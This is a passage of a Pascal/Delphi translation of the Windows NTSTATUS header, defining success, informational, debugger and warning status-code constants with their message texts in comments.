// MessageId: STATUS_TIMEOUT
//
// MessageText:
//
//  STATUS_TIMEOUT
//
STATUS_TIMEOUT                   = NTSTATUS($00000102);    // winnt

//
// MessageId: STATUS_PENDING
//
// MessageText:
//
// The operation that was requested is pending completion.
//
STATUS_PENDING                   = NTSTATUS($00000103);    // winnt

//
// MessageId: STATUS_REPARSE
//
// MessageText:
//
// A reparse should be performed by the Object Manager since the name of the file resulted in a symbolic link.
//
STATUS_REPARSE                   = NTSTATUS($00000104);

//
// MessageId: STATUS_MORE_ENTRIES
//
// MessageText:
//
// Returned by enumeration APIs to indicate more information is available to successive calls.
//
STATUS_MORE_ENTRIES              = NTSTATUS($00000105);

//
// MessageId: STATUS_NOT_ALL_ASSIGNED
//
// MessageText:
//
// Indicates not all privileges or groups referenced are assigned to the caller.
// This allows, for example, all privileges to be disabled without having to know exactly which privileges are assigned.
//
STATUS_NOT_ALL_ASSIGNED          = NTSTATUS($00000106);

//
// MessageId: STATUS_SOME_NOT_MAPPED
//
// MessageText:
//
// Some of the information to be translated has not been translated.
//
STATUS_SOME_NOT_MAPPED           = NTSTATUS($00000107);

//
// MessageId: STATUS_OPLOCK_BREAK_IN_PROGRESS
//
// MessageText:
//
// An open/create operation completed while an oplock break is underway.
//
STATUS_OPLOCK_BREAK_IN_PROGRESS  = NTSTATUS($00000108);

//
// MessageId: STATUS_VOLUME_MOUNTED
//
// MessageText:
//
// A new volume has been mounted by a file system.
//
STATUS_VOLUME_MOUNTED            = NTSTATUS($00000109);

//
// MessageId: STATUS_RXACT_COMMITTED
//
// MessageText:
//
// This success level status indicates that the transaction state already exists for the registry sub-tree, but that a transaction commit was previously aborted. The commit has now been completed.
//
STATUS_RXACT_COMMITTED           = NTSTATUS($0000010A);

//
// MessageId: STATUS_NOTIFY_CLEANUP
//
// MessageText:
//
// This indicates that a notify change request has been completed due to closing the handle which made the notify change request.
//
STATUS_NOTIFY_CLEANUP            = NTSTATUS($0000010B);

//
// MessageId: STATUS_NOTIFY_ENUM_DIR
//
// MessageText:
//
// This indicates that a notify change request is being completed and that the information is not being returned in the caller's buffer.
// The caller now needs to enumerate the files to find the changes.
//
STATUS_NOTIFY_ENUM_DIR           = NTSTATUS($0000010C);

//
// MessageId: STATUS_NO_QUOTAS_FOR_ACCOUNT
//
// MessageText:
//
// {No Quotas}
// No system quota limits are specifically set for this account.
//
STATUS_NO_QUOTAS_FOR_ACCOUNT     = NTSTATUS($0000010D);

//
// MessageId: STATUS_PRIMARY_TRANSPORT_CONNECT_FAILED
//
// MessageText:
//
// {Connect Failure on Primary Transport}
// An attempt was made to connect to the remote server %hs on the primary transport, but the connection failed.
// The computer WAS able to connect on a secondary transport.
//
STATUS_PRIMARY_TRANSPORT_CONNECT_FAILED = NTSTATUS($0000010E);

//
// MessageId: STATUS_PAGE_FAULT_TRANSITION
//
// MessageText:
//
// Page fault was a transition fault.
//
STATUS_PAGE_FAULT_TRANSITION     = NTSTATUS($00000110);

//
// MessageId: STATUS_PAGE_FAULT_DEMAND_ZERO
//
// MessageText:
//
// Page fault was a demand zero fault.
//
STATUS_PAGE_FAULT_DEMAND_ZERO    = NTSTATUS($00000111);

//
// MessageId: STATUS_PAGE_FAULT_COPY_ON_WRITE
//
// MessageText:
//
// Page fault was a demand zero fault.
//
STATUS_PAGE_FAULT_COPY_ON_WRITE  = NTSTATUS($00000112);

//
// MessageId: STATUS_PAGE_FAULT_GUARD_PAGE
//
// MessageText:
//
// Page fault was a demand zero fault.
//
STATUS_PAGE_FAULT_GUARD_PAGE     = NTSTATUS($00000113);

//
// MessageId: STATUS_PAGE_FAULT_PAGING_FILE
//
// MessageText:
//
// Page fault was satisfied by reading from a secondary storage device.
//
STATUS_PAGE_FAULT_PAGING_FILE    = NTSTATUS($00000114);

//
// MessageId: STATUS_CACHE_PAGE_LOCKED
//
// MessageText:
//
// Cached page was locked during operation.
//
STATUS_CACHE_PAGE_LOCKED         = NTSTATUS($00000115);

//
// MessageId: STATUS_CRASH_DUMP
//
// MessageText:
//
// Crash dump exists in paging file.
//
STATUS_CRASH_DUMP                = NTSTATUS($00000116);

//
// MessageId: STATUS_BUFFER_ALL_ZEROS
//
// MessageText:
//
// Specified buffer contains all zeros.
//
STATUS_BUFFER_ALL_ZEROS          = NTSTATUS($00000117);

//
// MessageId: STATUS_REPARSE_OBJECT
//
// MessageText:
//
// A reparse should be performed by the Object Manager since the name of the file resulted in a symbolic link.
//
STATUS_REPARSE_OBJECT            = NTSTATUS($00000118);

//
// MessageId: STATUS_RESOURCE_REQUIREMENTS_CHANGED
//
// MessageText:
//
// The device has succeeded a query-stop and its resource requirements have changed.
//
STATUS_RESOURCE_REQUIREMENTS_CHANGED = NTSTATUS($00000119);

//
// MessageId: STATUS_TRANSLATION_COMPLETE
//
// MessageText:
//
// The translator has translated these resources into the global space and no further translations should be performed.
//
STATUS_TRANSLATION_COMPLETE      = NTSTATUS($00000120);

//
// MessageId: STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY
//
// MessageText:
//
// The directory service evaluated group memberships locally, as it was unable to contact a global catalog server.
//
STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY = NTSTATUS($00000121);

//
// MessageId: STATUS_NOTHING_TO_TERMINATE
//
// MessageText:
//
// A process being terminated has no threads to terminate.
//
STATUS_NOTHING_TO_TERMINATE      = NTSTATUS($00000122);

//
// MessageId: STATUS_PROCESS_NOT_IN_JOB
//
// MessageText:
//
// The specified process is not part of a job.
//
STATUS_PROCESS_NOT_IN_JOB        = NTSTATUS($00000123);

//
// MessageId: STATUS_PROCESS_IN_JOB
//
// MessageText:
//
// The specified process is part of a job.
//
STATUS_PROCESS_IN_JOB            = NTSTATUS($00000124);

//
// MessageId: STATUS_VOLSNAP_HIBERNATE_READY
//
// MessageText:
//
// {Volume Shadow Copy Service}
// The system is now ready for hibernation.
//
STATUS_VOLSNAP_HIBERNATE_READY   = NTSTATUS($00000125);

//
// MessageId: STATUS_FSFILTER_OP_COMPLETED_SUCCESSFULLY
//
// MessageText:
//
// A file system or file system filter driver has successfully completed an FsFilter operation.
//
STATUS_FSFILTER_OP_COMPLETED_SUCCESSFULLY = NTSTATUS($00000126);

//
// MessageId: STATUS_INTERRUPT_VECTOR_ALREADY_CONNECTED
//
// MessageText:
//
// The specified interrupt vector was already connected.
//
STATUS_INTERRUPT_VECTOR_ALREADY_CONNECTED = NTSTATUS($00000127);

//
// MessageId: STATUS_INTERRUPT_STILL_CONNECTED
//
// MessageText:
//
// The specified interrupt vector is still connected.
//
STATUS_INTERRUPT_STILL_CONNECTED = NTSTATUS($00000128);

//
// MessageId: STATUS_PROCESS_CLONED
//
// MessageText:
//
// The current process is a cloned process.
//
STATUS_PROCESS_CLONED            = NTSTATUS($00000129);

//
// MessageId: STATUS_FILE_LOCKED_WITH_ONLY_READERS
//
// MessageText:
//
// The file was locked and all users of the file can only read.
//
STATUS_FILE_LOCKED_WITH_ONLY_READERS = NTSTATUS($0000012A);

//
// MessageId: STATUS_FILE_LOCKED_WITH_WRITERS
//
// MessageText:
//
// The file was locked and at least one user of the file can write.
//
STATUS_FILE_LOCKED_WITH_WRITERS  = NTSTATUS($0000012B);

//
// MessageId: STATUS_VALID_IMAGE_HASH
//
// MessageText:
//
// The file image hash is valid.
//
STATUS_VALID_IMAGE_HASH          = NTSTATUS($0000012C);

//
// MessageId: STATUS_VALID_CATALOG_HASH
//
// MessageText:
//
// The file catalog hash is valid.
//
STATUS_VALID_CATALOG_HASH        = NTSTATUS($0000012D);

//
// MessageId: STATUS_VALID_STRONG_CODE_HASH
//
// MessageText:
//
// The file hash is valid and uses strong code integrity.
//
STATUS_VALID_STRONG_CODE_HASH    = NTSTATUS($0000012E);

//
// MessageId: STATUS_GHOSTED
//
// MessageText:
//
// At least a portion of IO range intersects with a ghosted file range.
//
STATUS_GHOSTED                   = NTSTATUS($0000012F);

//
// MessageId: STATUS_DATA_OVERWRITTEN
//
// MessageText:
//
// A completed operation may have overwritten previous data.
//
STATUS_DATA_OVERWRITTEN          = NTSTATUS($00000130);

//
// MessageId: STATUS_RESOURCEMANAGER_READ_ONLY
//
// MessageText:
//
// The specified ResourceManager made no changes or updates to the resource under this transaction.
//
STATUS_RESOURCEMANAGER_READ_ONLY = NTSTATUS($00000202);

//
// MessageId: STATUS_RING_PREVIOUSLY_EMPTY
//
// MessageText:
//
// The specified ring buffer was empty before the packet was successfully inserted.
//
STATUS_RING_PREVIOUSLY_EMPTY     = NTSTATUS($00000210);

//
// MessageId: STATUS_RING_PREVIOUSLY_FULL
//
// MessageText:
//
// The specified ring buffer was full before the packet was successfully removed.
//
STATUS_RING_PREVIOUSLY_FULL      = NTSTATUS($00000211);

//
// MessageId: STATUS_RING_PREVIOUSLY_ABOVE_QUOTA
//
// MessageText:
//
// The specified ring buffer has dropped below its quota of outstanding transactions.
//
STATUS_RING_PREVIOUSLY_ABOVE_QUOTA = NTSTATUS($00000212);

//
// MessageId: STATUS_RING_NEWLY_EMPTY
//
// MessageText:
//
// The specified ring buffer has, with the removal of the current packet, now become empty.
//
STATUS_RING_NEWLY_EMPTY          = NTSTATUS($00000213);

//
// MessageId: STATUS_RING_SIGNAL_OPPOSITE_ENDPOINT
//
// MessageText:
//
// The specified ring buffer was either previously empty or previously full which implies that the caller should signal the opposite endpoint.
//
STATUS_RING_SIGNAL_OPPOSITE_ENDPOINT = NTSTATUS($00000214);

//
// MessageId: STATUS_OPLOCK_SWITCHED_TO_NEW_HANDLE
//
// MessageText:
//
// The oplock that was associated with this handle is now associated with a different handle.
//
STATUS_OPLOCK_SWITCHED_TO_NEW_HANDLE = NTSTATUS($00000215);

//
// MessageId: STATUS_OPLOCK_HANDLE_CLOSED
//
// MessageText:
//
// The handle with which this oplock was associated has been closed.  The oplock is now broken.
//
STATUS_OPLOCK_HANDLE_CLOSED      = NTSTATUS($00000216);

//
// MessageId: STATUS_WAIT_FOR_OPLOCK
//
// MessageText:
//
// An operation is blocked waiting for an oplock.
//
STATUS_WAIT_FOR_OPLOCK           = NTSTATUS($00000367);

//
// MessageId: STATUS_REPARSE_GLOBAL
//
// MessageText:
//
// A reparse should be performed by the Object Manager from the global root to escape the container name space.
//
STATUS_REPARSE_GLOBAL            = NTSTATUS($00000368);

//
// MessageId: DBG_EXCEPTION_HANDLED
//
// MessageText:
//
// Debugger handled exception
//
DBG_EXCEPTION_HANDLED            = NTSTATUS($00010001);    // winnt

//
// MessageId: DBG_CONTINUE
//
// MessageText:
//
// Debugger continued
//
DBG_CONTINUE                     = NTSTATUS($00010002);    // winnt

//
// MessageId: STATUS_FLT_IO_COMPLETE
//
// MessageText:
//
// The IO was completed by a filter.
//
STATUS_FLT_IO_COMPLETE           = NTSTATUS($001C0001);

/////////////////////////////////////////////////////////////////////////
//
// Standard Information values
//
/////////////////////////////////////////////////////////////////////////

//
// MessageId: STATUS_OBJECT_NAME_EXISTS
//
// MessageText:
//
// {Object Exists}
// An attempt was made to create an object and the object name already existed.
//
STATUS_OBJECT_NAME_EXISTS        = NTSTATUS($40000000);

//
// MessageId: STATUS_THREAD_WAS_SUSPENDED
//
// MessageText:
//
// {Thread Suspended}
// A thread termination occurred while the thread was suspended. The thread was resumed, and termination proceeded.
//
STATUS_THREAD_WAS_SUSPENDED      = NTSTATUS($40000001);

//
// MessageId: STATUS_WORKING_SET_LIMIT_RANGE
//
// MessageText:
//
// {Working Set Range Error}
// An attempt was made to set the working set minimum or maximum to values which are outside of the allowable range.
//
STATUS_WORKING_SET_LIMIT_RANGE   = NTSTATUS($40000002);

//
// MessageId: STATUS_IMAGE_NOT_AT_BASE
//
// MessageText:
//
// {Image Relocated}
// An image file could not be mapped at the address specified in the image file. Local fixups must be performed on this image.
//
STATUS_IMAGE_NOT_AT_BASE         = NTSTATUS($40000003);

//
// MessageId: STATUS_RXACT_STATE_CREATED
//
// MessageText:
//
// This informational level status indicates that a specified registry sub-tree transaction state did not yet exist and had to be created.
//
STATUS_RXACT_STATE_CREATED       = NTSTATUS($40000004);

//
// MessageId: STATUS_SEGMENT_NOTIFICATION
//
// MessageText:
//
// {Segment Load}
// A virtual DOS machine (VDM) is loading, unloading, or moving an MS-DOS or Win16 program segment image.
// An exception is raised so a debugger can load, unload or track symbols and breakpoints within these 16-bit segments.
//
STATUS_SEGMENT_NOTIFICATION      = NTSTATUS($40000005);    // winnt

//
// MessageId: STATUS_LOCAL_USER_SESSION_KEY
//
// MessageText:
//
// {Local Session Key}
// A user session key was requested for a local RPC connection. The session key returned is a constant value and not unique to this connection.
//
STATUS_LOCAL_USER_SESSION_KEY    = NTSTATUS($40000006);

//
// MessageId: STATUS_BAD_CURRENT_DIRECTORY
//
// MessageText:
//
// {Invalid Current Directory}
// The process cannot switch to the startup current directory %hs.
// Select OK to set current directory to %hs, or select CANCEL to exit.
//
STATUS_BAD_CURRENT_DIRECTORY     = NTSTATUS($40000007);

//
// MessageId: STATUS_SERIAL_MORE_WRITES
//
// MessageText:
//
// {Serial IOCTL Complete}
// A serial I/O operation was completed by another write to a serial port.
// (The IOCTL_SERIAL_XOFF_COUNTER reached zero.)
//
STATUS_SERIAL_MORE_WRITES        = NTSTATUS($40000008);

//
// MessageId: STATUS_REGISTRY_RECOVERED
//
// MessageText:
//
// {Registry Recovery}
// One of the files containing the system's Registry data had to be recovered by use of a log or alternate copy. The recovery was successful.
//
STATUS_REGISTRY_RECOVERED        = NTSTATUS($40000009);

//
// MessageId: STATUS_FT_READ_RECOVERY_FROM_BACKUP
//
// MessageText:
//
// {Redundant Read}
// To satisfy a read request, the NT fault-tolerant file system successfully read the requested data from a redundant copy.
// This was done because the file system encountered a failure on a member of the fault-tolerant volume, but was unable to reassign the failing area of the device.
//
STATUS_FT_READ_RECOVERY_FROM_BACKUP = NTSTATUS($4000000A);

//
// MessageId: STATUS_FT_WRITE_RECOVERY
//
// MessageText:
//
// {Redundant Write}
// To satisfy a write request, the NT fault-tolerant file system successfully wrote a redundant copy of the information.
// This was done because the file system encountered a failure on a member of the fault-tolerant volume, but was not able to reassign the failing area of the device.
//
STATUS_FT_WRITE_RECOVERY         = NTSTATUS($4000000B);

//
// MessageId: STATUS_SERIAL_COUNTER_TIMEOUT
//
// MessageText:
//
// {Serial IOCTL Timeout}
// A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER had not reached zero.)
//
STATUS_SERIAL_COUNTER_TIMEOUT    = NTSTATUS($4000000C);

//
// MessageId: STATUS_NULL_LM_PASSWORD
//
// MessageText:
//
// {Password Too Complex}
// The Windows password is too complex to be converted to a LAN Manager password. The LAN Manager password returned is a NULL string.
//
STATUS_NULL_LM_PASSWORD          = NTSTATUS($4000000D);

//
// MessageId: STATUS_IMAGE_MACHINE_TYPE_MISMATCH
//
// MessageText:
//
// {Machine Type Mismatch}
// The image file %hs is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.
//
STATUS_IMAGE_MACHINE_TYPE_MISMATCH = NTSTATUS($4000000E);

//
// MessageId: STATUS_RECEIVE_PARTIAL
//
// MessageText:
//
// {Partial Data Received}
// The network transport returned partial data to its client. The remaining data will be sent later.
//
STATUS_RECEIVE_PARTIAL           = NTSTATUS($4000000F);

//
// MessageId: STATUS_RECEIVE_EXPEDITED
//
// MessageText:
//
// {Expedited Data Received}
// The network transport returned data to its client that was marked as expedited by the remote system.
//
STATUS_RECEIVE_EXPEDITED         = NTSTATUS($40000010);

//
// MessageId: STATUS_RECEIVE_PARTIAL_EXPEDITED
//
// MessageText:
//
// {Partial Expedited Data Received}
// The network transport returned partial data to its client and this data was marked as expedited by the remote system. The remaining data will be sent later.
//
STATUS_RECEIVE_PARTIAL_EXPEDITED = NTSTATUS($40000011);

//
// MessageId: STATUS_EVENT_DONE
//
// MessageText:
//
// {TDI Event Done}
// The TDI indication has completed successfully.
//
STATUS_EVENT_DONE                = NTSTATUS($40000012);

//
// MessageId: STATUS_EVENT_PENDING
//
// MessageText:
//
// {TDI Event Pending}
// The TDI indication has entered the pending state.
//
STATUS_EVENT_PENDING             = NTSTATUS($40000013);

//
// MessageId: STATUS_CHECKING_FILE_SYSTEM
//
// MessageText:
//
// Checking file system on %wZ
//
STATUS_CHECKING_FILE_SYSTEM      = NTSTATUS($40000014);

//
// MessageId: STATUS_FATAL_APP_EXIT
//
// MessageText:
//
// {Fatal Application Exit}
// %hs
//
STATUS_FATAL_APP_EXIT            = NTSTATUS($40000015);    // winnt

//
// MessageId: STATUS_PREDEFINED_HANDLE
//
// MessageText:
//
// The specified registry key is referenced by a predefined handle.
//
STATUS_PREDEFINED_HANDLE         = NTSTATUS($40000016);

//
// MessageId: STATUS_WAS_UNLOCKED
//
// MessageText:
//
// {Page Unlocked}
// The page protection of a locked page was changed to 'No Access' and the page was unlocked from memory and from the process.
//
STATUS_WAS_UNLOCKED              = NTSTATUS($40000017);

//
// MessageId: STATUS_SERVICE_NOTIFICATION
//
// MessageText:
//
// %hs
//
STATUS_SERVICE_NOTIFICATION      = NTSTATUS($40000018);

//
// MessageId: STATUS_WAS_LOCKED
//
// MessageText:
//
// {Page Locked}
// One of the pages to lock was already locked.
//
STATUS_WAS_LOCKED                = NTSTATUS($40000019);

//
// MessageId: STATUS_LOG_HARD_ERROR
//
// MessageText:
//
// Application popup: %1 : %2
//
STATUS_LOG_HARD_ERROR            = NTSTATUS($4000001A);

//
// MessageId: STATUS_ALREADY_WIN32
//
// MessageText:
//
//  STATUS_ALREADY_WIN32
//
STATUS_ALREADY_WIN32             = NTSTATUS($4000001B);

//
// MessageId: STATUS_WX86_UNSIMULATE
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_UNSIMULATE           = NTSTATUS($4000001C);

//
// MessageId: STATUS_WX86_CONTINUE
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_CONTINUE             = NTSTATUS($4000001D);

//
// MessageId: STATUS_WX86_SINGLE_STEP
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_SINGLE_STEP          = NTSTATUS($4000001E);

//
// MessageId: STATUS_WX86_BREAKPOINT
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_BREAKPOINT           = NTSTATUS($4000001F);

//
// MessageId: STATUS_WX86_EXCEPTION_CONTINUE
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_EXCEPTION_CONTINUE   = NTSTATUS($40000020);

//
// MessageId: STATUS_WX86_EXCEPTION_LASTCHANCE
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_EXCEPTION_LASTCHANCE = NTSTATUS($40000021);

//
// MessageId: STATUS_WX86_EXCEPTION_CHAIN
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_EXCEPTION_CHAIN      = NTSTATUS($40000022);

//
// MessageId: STATUS_IMAGE_MACHINE_TYPE_MISMATCH_EXE
//
// MessageText:
//
// {Machine Type Mismatch}
// The image file %hs is valid, but is for a machine type other than the current machine.
//
STATUS_IMAGE_MACHINE_TYPE_MISMATCH_EXE = NTSTATUS($40000023);

//
// MessageId: STATUS_NO_YIELD_PERFORMED
//
// MessageText:
//
// A yield execution was performed and no thread was available to run.
//
STATUS_NO_YIELD_PERFORMED        = NTSTATUS($40000024);

//
// MessageId: STATUS_TIMER_RESUME_IGNORED
//
// MessageText:
//
// The resumable flag to a timer API was ignored.
//
STATUS_TIMER_RESUME_IGNORED      = NTSTATUS($40000025);

//
// MessageId: STATUS_ARBITRATION_UNHANDLED
//
// MessageText:
//
// The arbiter has deferred arbitration of these resources to its parent
//
STATUS_ARBITRATION_UNHANDLED     = NTSTATUS($40000026);

//
// MessageId: STATUS_CARDBUS_NOT_SUPPORTED
//
// MessageText:
//
// The device "%hs" has detected a CardBus card in its slot, but the firmware on this system is not configured to allow the CardBus controller to be run in CardBus mode.
// The operating system will currently accept only 16-bit (R2) pc-cards on this controller.
//
STATUS_CARDBUS_NOT_SUPPORTED     = NTSTATUS($40000027);

//
// MessageId: STATUS_WX86_CREATEWX86TIB
//
// MessageText:
//
// Exception status code used by Win32 x86 emulation subsystem.
//
STATUS_WX86_CREATEWX86TIB        = NTSTATUS($40000028);

//
// MessageId: STATUS_MP_PROCESSOR_MISMATCH
//
// MessageText:
//
// The CPUs in this multiprocessor system are not all the same revision level. To use all processors the operating system restricts itself to the features of the least capable processor in the system. Should problems occur with this system, contact the CPU manufacturer to see if this mix of processors is supported.
//
STATUS_MP_PROCESSOR_MISMATCH     = NTSTATUS($40000029);

//
// MessageId: STATUS_HIBERNATED
//
// MessageText:
//
// The system was put into hibernation.
//
STATUS_HIBERNATED                = NTSTATUS($4000002A);

//
// MessageId: STATUS_RESUME_HIBERNATION
//
// MessageText:
//
// The system was resumed from hibernation.
//
STATUS_RESUME_HIBERNATION        = NTSTATUS($4000002B);

//
// MessageId: STATUS_FIRMWARE_UPDATED
//
// MessageText:
//
// Windows has detected that the system firmware (BIOS) was updated [previous firmware date = %2, current firmware date %3].
//
STATUS_FIRMWARE_UPDATED          = NTSTATUS($4000002C);

//
// MessageId: STATUS_DRIVERS_LEAKING_LOCKED_PAGES
//
// MessageText:
//
// A device driver is leaking locked I/O pages causing system degradation. The system has automatically enabled tracking code in order to try and catch the culprit.
//
STATUS_DRIVERS_LEAKING_LOCKED_PAGES = NTSTATUS($4000002D);

//
// MessageId: STATUS_MESSAGE_RETRIEVED
//
// MessageText:
//
// The ALPC message being canceled has already been retrieved from the queue on the other side.
//
STATUS_MESSAGE_RETRIEVED         = NTSTATUS($4000002E);

//
// MessageId: STATUS_SYSTEM_POWERSTATE_TRANSITION
//
// MessageText:
//
// The system power state is transitioning from %2 to %3.
//
STATUS_SYSTEM_POWERSTATE_TRANSITION = NTSTATUS($4000002F);

//
// MessageId: STATUS_ALPC_CHECK_COMPLETION_LIST
//
// MessageText:
//
// The receive operation was successful. Check the ALPC completion list for the received message.
//
STATUS_ALPC_CHECK_COMPLETION_LIST = NTSTATUS($40000030);

//
// MessageId: STATUS_SYSTEM_POWERSTATE_COMPLEX_TRANSITION
//
// MessageText:
//
// The system power state is transitioning from %2 to %3 but could enter %4.
//
STATUS_SYSTEM_POWERSTATE_COMPLEX_TRANSITION = NTSTATUS($40000031);

//
// MessageId: STATUS_ACCESS_AUDIT_BY_POLICY
//
// MessageText:
//
// Access to %1 is monitored by policy rule %2.
//
STATUS_ACCESS_AUDIT_BY_POLICY    = NTSTATUS($40000032);

//
// MessageId: STATUS_ABANDON_HIBERFILE
//
// MessageText:
//
// A valid hibernation file has been invalidated and should be abandoned.
//
STATUS_ABANDON_HIBERFILE         = NTSTATUS($40000033);

//
// MessageId: STATUS_BIZRULES_NOT_ENABLED
//
// MessageText:
//
// Business rule scripts are disabled for the calling application.
//
STATUS_BIZRULES_NOT_ENABLED      = NTSTATUS($40000034);

//
// MessageId: STATUS_FT_READ_FROM_COPY
//
// MessageText:
//
// The specified copy of the requested data was successfully read.
//
STATUS_FT_READ_FROM_COPY         = NTSTATUS($40000035);

//
// MessageId: STATUS_IMAGE_AT_DIFFERENT_BASE
//
// MessageText:
//
// {Image Relocated}
// An image file was mapped at a different address from the one specified in the image file but fixups will still be automatically performed on the image.
//
STATUS_IMAGE_AT_DIFFERENT_BASE   = NTSTATUS($40000036);

//
// MessageId: STATUS_PATCH_DEFERRED
//
// MessageText:
//
// A system patch was successfully loaded but is not applicable to any currently loaded images.
//
STATUS_PATCH_DEFERRED            = NTSTATUS($40000037);

//
// MessageId: DBG_REPLY_LATER
//
// MessageText:
//
// Debugger will reply later.
//
DBG_REPLY_LATER                  = NTSTATUS($40010001);    // winnt

//
// MessageId: DBG_UNABLE_TO_PROVIDE_HANDLE
//
// MessageText:
//
// Debugger cannot provide handle.
//
DBG_UNABLE_TO_PROVIDE_HANDLE     = NTSTATUS($40010002);

//
// MessageId: DBG_TERMINATE_THREAD
//
// MessageText:
//
// Debugger terminated thread.
//
DBG_TERMINATE_THREAD             = NTSTATUS($40010003);    // winnt

//
// MessageId: DBG_TERMINATE_PROCESS
//
// MessageText:
//
// Debugger terminated process.
//
DBG_TERMINATE_PROCESS            = NTSTATUS($40010004);    // winnt

//
// MessageId: DBG_CONTROL_C
//
// MessageText:
//
// Debugger got control C.
//
DBG_CONTROL_C                    = NTSTATUS($40010005);    // winnt

//
// MessageId: DBG_PRINTEXCEPTION_C
//
// MessageText:
//
// Debugger printed exception on control C.
//
DBG_PRINTEXCEPTION_C             = NTSTATUS($40010006);    // winnt

//
// MessageId: DBG_RIPEXCEPTION
//
// MessageText:
//
// Debugger received RIP exception.
//
DBG_RIPEXCEPTION                 = NTSTATUS($40010007);    // winnt

//
// MessageId: DBG_CONTROL_BREAK
//
// MessageText:
//
// Debugger received control break.
//
DBG_CONTROL_BREAK                = NTSTATUS($40010008);    // winnt

//
// MessageId: DBG_COMMAND_EXCEPTION
//
// MessageText:
//
// Debugger command communication exception.
//
DBG_COMMAND_EXCEPTION            = NTSTATUS($40010009);    // winnt

//
// MessageId: DBG_PRINTEXCEPTION_WIDE_C
//
// MessageText:
//
// Debugger printed exception on control C.
//
DBG_PRINTEXCEPTION_WIDE_C        = NTSTATUS($4001000A);    // winnt

//
// MessageId: STATUS_HEURISTIC_DAMAGE_POSSIBLE
//
// MessageText:
//
// The attempt to commit the Transaction completed, but it is possible that some portion of the transaction tree did not commit successfully due to heuristics.  Therefore it is possible that some data modified in the transaction may not have committed, resulting in transactional inconsistency.  If possible, check the consistency of the associated data.
//
STATUS_HEURISTIC_DAMAGE_POSSIBLE = NTSTATUS($40190001);



/////////////////////////////////////////////////////////////////////////
//
// Standard Warning values
//
//
// Note:  Do NOT use the value 0x80000000L, as this is a non-portable value
//        for the NT_SUCCESS macro. Warning values start with a code of 1.
//
/////////////////////////////////////////////////////////////////////////

//
// MessageId: STATUS_GUARD_PAGE_VIOLATION
//
// MessageText:
//
// {EXCEPTION}
// Guard Page Exception
// A page of memory that marks the end of a data structure, such as a stack or an array, has been accessed.
//
STATUS_GUARD_PAGE_VIOLATION      = NTSTATUS($80000001);    // winnt

//
// MessageId: STATUS_DATATYPE_MISALIGNMENT
//
// MessageText:
//
// {EXCEPTION}
// Alignment Fault
// A datatype misalignment was detected in a load or store instruction.
//
STATUS_DATATYPE_MISALIGNMENT     = NTSTATUS($80000002);    // winnt

//
// MessageId: STATUS_BREAKPOINT
//
// MessageText:
//
// {EXCEPTION}
// Breakpoint
// A breakpoint has been reached.
//
STATUS_BREAKPOINT                = NTSTATUS($80000003);    // winnt

//
// MessageId: STATUS_SINGLE_STEP
//
// MessageText:
//
// {EXCEPTION}
// Single Step
// A single step or trace operation has just been completed.
//
STATUS_SINGLE_STEP               = NTSTATUS($80000004);    // winnt

//
// MessageId: STATUS_BUFFER_OVERFLOW
//
// MessageText:
//
// {Buffer Overflow}
// The data was too large to fit into the specified buffer.
//
STATUS_BUFFER_OVERFLOW           = NTSTATUS($80000005);

//
// MessageId: STATUS_NO_MORE_FILES
//
// MessageText:
//
// {No More Files}
// No more files were found which match the file specification.
//
STATUS_NO_MORE_FILES             = NTSTATUS($80000006);

//
// MessageId: STATUS_WAKE_SYSTEM_DEBUGGER
//
// MessageText:
//
// {Kernel Debugger Awakened}
// the system debugger was awakened by an interrupt.
//
STATUS_WAKE_SYSTEM_DEBUGGER      = NTSTATUS($80000007);

//
// MessageId: STATUS_HANDLES_CLOSED
//
// MessageText:
//
// {Handles Closed}
// Handles to objects have been automatically closed as a result of the requested operation.
//
STATUS_HANDLES_CLOSED            = NTSTATUS($8000000A);

//
// MessageId: STATUS_NO_INHERITANCE
//
// MessageText:
//
// {Non-Inheritable ACL}
// An access control list (AC); contains no components that can be inherited.
//
STATUS_NO_INHERITANCE            = NTSTATUS($8000000B);

//
// MessageId: STATUS_GUID_SUBSTITUTION_MADE
//
// MessageText:
//
// {GUID Substitution}
// During the translation of a global identifier (GUID) to a Windows security ID (SID), no administratively-defined GUID prefix was found. A substitute prefix was used, which will not compromise system security. However, this may provide a more restrictive access than intended.
//
STATUS_GUID_SUBSTITUTION_MADE    = NTSTATUS($8000000C);

//
// MessageId: STATUS_PARTIAL_COPY
//
// MessageText:
//
// {Partial Copy}
// Due to protection conflicts not all the requested bytes could be copied.
//
STATUS_PARTIAL_COPY              = NTSTATUS($8000000D);

//
// MessageId: STATUS_DEVICE_PAPER_EMPTY
//
// MessageText:
//
// {Out of Paper}
// The printer is out of paper.
//
STATUS_DEVICE_PAPER_EMPTY        = NTSTATUS($8000000E);

//
// MessageId: STATUS_DEVICE_POWERED_OFF
//
// MessageText:
//
// {Device Power Is Off}
// The printer power has been turned off.
//
STATUS_DEVICE_POWERED_OFF        = NTSTATUS($8000000F);

//
// MessageId: STATUS_DEVICE_OFF_LINE
//
// MessageText:
//
// {Device Offline}
// The printer has been taken offline.
//
STATUS_DEVICE_OFF_LINE           = NTSTATUS($80000010);

//
// MessageId: STATUS_DEVICE_BUSY
//
// MessageText:
//
// {Device Busy}
// The device is currently busy.
//
STATUS_DEVICE_BUSY               = NTSTATUS($80000011);

//
// MessageId: STATUS_NO_MORE_EAS
//
// MessageText:
//
// {No More EAs}
// No more extended attributes (EAs) were found for the file.
//
STATUS_NO_MORE_EAS               = NTSTATUS($80000012);

//
// MessageId: STATUS_INVALID_EA_NAME
//
// MessageText:
//
// {Illegal EA}
// The specified extended attribute (EA) name contains at least one illegal character.
//
STATUS_INVALID_EA_NAME           = NTSTATUS($80000013);

//
// MessageId: STATUS_EA_LIST_INCONSISTENT
//
// MessageText:
//
